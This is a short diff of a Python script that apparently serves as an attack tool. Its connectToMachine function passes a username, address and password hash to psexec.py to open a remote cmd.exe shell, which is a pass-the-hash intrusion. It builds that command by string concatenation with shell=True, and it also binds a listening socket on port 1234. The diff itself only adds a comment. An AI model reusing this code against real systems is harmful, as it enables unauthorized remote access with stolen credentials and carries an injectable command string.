@@ -10,7 +10,7 @@ def connectToMachine():
     dir = os.getcwd()
     cmnd = "python psexec.py -hashes " + hashToEnter + " " + userName + "@" + address[0] + " cmd.exe"
     proc = subprocess.Popen(cmnd, cwd=dir, shell=True)
-    proc.wait()
+    proc.wait() #wait until the process (psexec.py) to finish to continue the normal program
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind(("0.0.0.0", 1234))
